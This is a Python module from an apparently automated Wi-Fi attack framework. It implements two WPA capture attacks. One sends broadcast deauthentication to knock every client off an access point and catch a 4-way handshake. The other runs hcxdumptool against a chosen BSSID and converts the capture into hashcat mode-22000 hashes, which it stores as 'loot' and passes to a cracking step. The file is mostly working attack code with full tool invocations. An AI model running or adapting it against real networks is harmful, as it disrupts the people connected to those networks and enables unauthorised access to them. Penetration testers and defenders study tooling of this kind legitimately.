"""Two more ways to *get* the loot: the blunt handshake, and the hcxtools pipeline.

* ``handshake_broadcast`` — the same 4-way capture as ``handshake``, but the
  deauthentication goes to every client at once.  More traffic, more chances, and the
  version a site's monitoring is most likely to notice: it is here because operators
  ask for it, and because the report should say what that trade costs.
* ``hcxdump_capture`` — hand the problem to `hcxdumptool`, whose whole design is
  client-less PMKID collection, and convert the result with `hcxpcapngtool` into the
  hashcat 22000 format.  Where ``pmkid`` asks the AP nicely, this one follows its own
  policy, which is why its own report says so.
"""

from __future__ import annotations

import contextlib
import os
import time
from typing import List

from ..deps import registry
from ..hash22000 import parse_file
from ..models import STATUS_SUCCESS, AccessPoint, Attempt, Capture, Finding
from ..util import Process, human_duration
from .base import Attack, AttackContext, AttackOutcome
from .handshake import HandshakeAttack


class HandshakeBroadcastAttack(HandshakeAttack):
    """Capture a handshake by knocking *every* client off at once."""

    name = "handshake_broadcast"
    label = "WPA handshake capture (broadcast deauth)"
    tool = "airodump-ng + aireplay-ng -0 (broadcast)"
    description = ("Listen on the channel and deauthenticate every client of the AP at "
                   "once, which makes several stations reconnect and gives several "
                   "chances at a 4-way handshake.  The single-client ``handshake`` is "
                   "quieter and better; this one exists for the case where it keeps "
                   "failing, and its report says plainly what it costs in visibility.")
    broadcast = True
    category = "capture"
    noise = "moderate"
    impact = "loot"

    def applies(self, ap: AccessPoint) -> bool:
        # a broadcast deauth needs clients: without any, the handshake attack's own
        # clientless path (PMKID) is the right answer, and the planner prefers it
        return super().applies(ap) and bool(ap.clients)

    def _run_demo(self, ctx: AttackContext, ap: AccessPoint, attempt: Attempt,
                  client: str = "") -> AttackOutcome:
        outcome = super()._run_demo(ctx, ap, attempt, client)
        if outcome.ok:
            outcome.extra["broadcast"] = True
            outcome.extra["clients_deauthenticated"] = len(ap.clients)
            outcome.extra["visibility"] = ("every client on the channel dropped at "
                                           "once: this is the variant a WIDS reacts to")
        return outcome


class HcxdumpCaptureAttack(Attack):
    """The hcxtools pipeline: hcxdumptool on air, hcxpcapngtool to hashcat 22000."""

    name = "hcxdump_capture"
    label = "hcxdumptool capture (client-less PMKID pipeline)"
    tool = "hcxdumptool + hcxpcapngtool"
    description = ("Run hcxdumptool against one BSSID for a bounded time and convert "
                   "everything it collects into hashcat's mode 22000 with "
                   "hcxpcapngtool.  The tool has its own idea of how to provoke a "
                   "handshake or a PMKID, which means it is louder than wifipilot's own "
                   "``pmkid`` and ``handshake`` attacks — and it needs no client at all.\n\n"
                   "The output is a hash file, not a password: cracking is the "
                   "``crack_sweep`` attack's job.")
    requires = ("hcxdumptool",)
    needs_injection = True
    category = "capture"
    noise = "moderate"
    impact = "loot"
    applies_to = ("WPA", "WPA2", "WPA2/WPA3")
    max_seconds = 120.0

    def applies(self, ap: AccessPoint) -> bool:
        return ap.encryption in ("WPA", "WPA2", "WPA2/WPA3") and not ap.sae

    # ---------------------------------------------------------------- #
    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = ctx.session.start_attempt(
            self.name, ap.bssid, tool=self.tool,
            chosen_by=getattr(ap, "picked_by", "heuristic"),
            reason=getattr(ap, "pick_reason", ""),
        )
        seconds = min(ctx.config.attack_timeout_for(self.name), self.max_seconds)
        ctx.bus.log(f"hcxdumptool on {ap.display_name} (ch {ap.channel or '?'}) for "
                    f"{human_duration(seconds)}: see the tool's own status output for "
                    f"what it is doing", level="info")
        if ctx.demo:
            return self._demo(ctx, ap, attempt)
        return self._live(ctx, ap, attempt, seconds)

    # ---------------------------------------------------------------- #
    def _report(self, ctx: AttackContext, ap: AccessPoint, attempt: Attempt,
                capture_path: str, hash_path: str, lines: List[object],
                seconds: float, simulated: bool, note: str = "") -> AttackOutcome:
        pmkids = [line for line in lines if getattr(line, "kind", "") == "pmkid"]
        handshakes = [line for line in lines if getattr(line, "kind", "") != "pmkid"]
        parts = [f"{len(lines)} hash line(s): {len(pmkids)} PMKID, "
                 f"{len(handshakes)} handshake"]
        if simulated:
            parts.append("simulated")
        detail = "; ".join(parts)
        if lines:
            saved = ctx.session.save_artifact(
                hash_path, "hash22000", ctx.loot_name(ap, "hcxdump"))
            ctx.session.add_capture(Capture(
                kind="hash", bssid=ap.bssid, essid=ap.essid, path=saved,
                valid=False, tool="hcxpcapngtool",
                extra={"format": "22000", "pmkids": len(pmkids),
                       "handshakes": len(handshakes), "simulated": simulated}))
        for line in lines[:1]:
            ctx.session.add_capture(Capture(
                kind="pmkid" if getattr(line, "kind", "") == "pmkid" else "handshake",
                bssid=ap.bssid, essid=ap.essid, path=capture_path or hash_path,
                valid=True, tool="hcxdumptool",
                extra={"simulated": simulated, "source": "hcxdumptool"}))
        if len(lines) >= 3:
            severity = "high"
        elif lines:
            severity = "medium"
        else:
            severity = "low"
        title = (f"hcxdumptool collected {len(lines)} hash line(s)"
                 if lines else "hcxdumptool collected nothing usable")
        body = (f"hcxdumptool ran for {human_duration(seconds)} against {ap.bssid} "
                f"and hcxpcapngtool turned the result into "
                f"{len(lines)} mode-22000 line(s).  "
                + ("Cracking is a separate step (``crack_sweep``): a hash file is not "
                   "a password." if lines else
                   "The target may be out of range, on another channel, or simply "
                   "already patched against client-less PMKID collection."))
        if note:
            body += f"  {note}"
        ctx.session.add_finding(Finding(kind=self.name, severity=severity,
                                        bssid=ap.bssid, title=title, detail=body))
        ap.remember(self.name, detail, lines=len(lines))
        if pmkids:
            ctx.session.stats.pmkids += 1
        if handshakes:
            ctx.session.stats.handshakes += 1
        ctx.session.end_attempt(attempt, STATUS_SUCCESS, title, detail)
        return AttackOutcome.success(
            title, detail=detail,
            extra={"lines": len(lines), "pmkids": len(pmkids),
                   "handshakes": len(handshakes), "seconds": round(seconds, 1),
                   "capture": capture_path, "hash": hash_path, "simulated": simulated,
                   "next": "crack_sweep" if lines else "",
                   "note": ("hcxdumptool has its own air policy: it is louder than "
                            "wifipilot's passive PMKID request")})

    # ---------------------------------------------------------------- #
    def _demo(self, ctx: AttackContext, ap: AccessPoint, attempt: Attempt
              ) -> AttackOutcome:
        """Write a real capture and run the *real* conversion path over it.

        `hcxpcapngtool` is not available in a demo, so the conversion is done by
        wifipilot's own mode-22000 writer: the lines that come out are then parsed by
        the same parser the cracker uses, which keeps the demo honest about the format.
        """
        from ..hash22000 import lines_from_analysis, write_lines
        from ..pcap import analyze_file
        from ..synth import build_capture

        started = time.time()
        for step in range(1, 4):
            ctx.progress(f"hcxdumptool on {ap.display_name}", kind="capture",
                         bssid=ap.bssid, percent=step * 28,
                         detail="client-less PMKID collection · simulation")
            time.sleep(0.25)
        station = next((client for client in ap.clients), "") or "02:00:00:00:00:41"
        capture_path = ctx.artifact_path("hcxdump", ap, ".pcap")
        demo_ap = ctx.radio.find(ap.bssid) if ctx.radio else None
        build_capture(capture_path, ap.essid or "demo", ap.bssid, station,
                      (demo_ap.psk if demo_ap else "") or "wifipilot-demo",
                      seed=abs(hash(ap.bssid)) % 99991, include_pmkid=True,
                      include_handshake=True)
        analysis = analyze_file(capture_path, max_packets=20000)
        lines = lines_from_analysis(analysis)
        if lines and int(ap.bssid.replace(":", ""), 16) % 3 == 0:
            lines = lines[:1]                          # some networks give up less
        hash_path = ctx.artifact_path("hash22000", ap, ".hc22000")
        write_lines(lines, hash_path)
        return self._report(ctx, ap, attempt, capture_path, hash_path,
                            parse_file(hash_path), time.time() - started, True)

    # ---------------------------------------------------------------- #
    def _live(self, ctx: AttackContext, ap: AccessPoint, attempt: Attempt,
              seconds: float) -> AttackOutcome:
        dump = registry.path("hcxdumptool")
        convert = registry.path("hcxpcapngtool")
        if not dump:
            return self._fail(
                ctx, attempt, "hcxdumptool missing",
                "install hcxtools (apt install hcxtools); wifipilot's own `pmkid` and "
                "`handshake` attacks need no extra tooling")
        if not convert:
            return self._fail(
                ctx, attempt, "hcxpcapngtool missing",
                "the conversion to hashcat 22000 is the point of this attack: install "
                "hcxtools, or use `pmkid`, which writes the format itself")
        ctx.set_channel(ap.channel)
        capture_path = ctx.artifact_path("hcxdump", ap, ".pcapng")
        hash_path = ctx.artifact_path("hash22000", ap, ".hc22000")
        filter_file = capture_path + ".filter"
        with open(filter_file, "w", encoding="utf-8") as handle:
            handle.write(f"{ap.bssid.lower()}\n")
        # v6-style invocation (the syntax most installs still ship) with the BSSID
        # filter file; hcxdumptool rejects unknown flags, which the error path reports
        args = [dump, "-i", ctx.monitor, "-o", capture_path, "--filterlist_ap",
                filter_file, "--filtermode=2", "--enable_status=1"]
        if ap.channel:
            args += ["-c", str(ap.channel)]
        proc = Process(args, name="hcxdumptool", echo_lines=ctx.config.verbose_tools)
        proc.start()
        if proc.error:
            return self._fail(ctx, attempt, "could not start hcxdumptool", proc.error)
        started = time.time()
        try:
            while not ctx.want_stop() and time.time() - started < seconds:
                time.sleep(1.0)
                ctx.progress(f"hcxdumptool on {ap.display_name}", kind="capture",
                             bssid=ap.bssid,
                             percent=min(95, (time.time() - started) / seconds * 100),
                             detail="collecting (see the tool's own counters)")
        finally:
            with contextlib.suppress(Exception):
                proc.stop()
            time.sleep(0.5)
        note = ""
        if not os.path.exists(capture_path) or not os.path.getsize(capture_path):
            return self._fail(
                ctx, attempt, "hcxdumptool produced no capture",
                "the tool ran but wrote nothing: the usual causes are a missing "
                "monitor interface, an unsupported hcxdumptool version (the flags "
                "changed between v6 and v7), or a BSSID that was not in range")
        conv = Process([convert, "-o", hash_path, capture_path], name="hcxpcapngtool",
                       echo_lines=ctx.config.verbose_tools)
        conv.start()
        if conv.error:
            return self._fail(ctx, attempt, "could not run hcxpcapngtool", conv.error)
        conv.wait(timeout=60)
        if not os.path.exists(hash_path):
            note = ("hcxpcapngtool wrote no hash file: the capture held no PMKID and no "
                    "complete handshake")
        lines = parse_file(hash_path) if os.path.exists(hash_path) else []
        return self._report(ctx, ap, attempt, capture_path, hash_path, lines,
                            time.time() - started, False, note)
